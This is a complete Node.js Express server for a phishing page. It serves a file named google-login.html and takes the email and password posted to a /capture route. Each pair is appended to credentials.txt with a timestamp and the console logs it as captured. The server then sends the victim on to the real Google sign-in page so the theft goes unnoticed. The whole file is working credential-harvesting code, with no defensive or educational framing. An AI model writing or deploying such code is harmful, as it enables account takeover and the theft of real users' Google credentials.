const express = require('express');
const fs = require('fs');

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/google-login.html');
});

app.post('/capture', (req, res) => {
  const { username, password } = req.body;
  const timestamp = new Date().toISOString();
  const entry = `[${timestamp}] Email: ${username} | Password: ${password}\n`;
  
  fs.appendFileSync('credentials.txt', entry);
  console.log('✅ Credentials captured:', username);
  
  res.redirect('https://accounts.google.com/signin');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
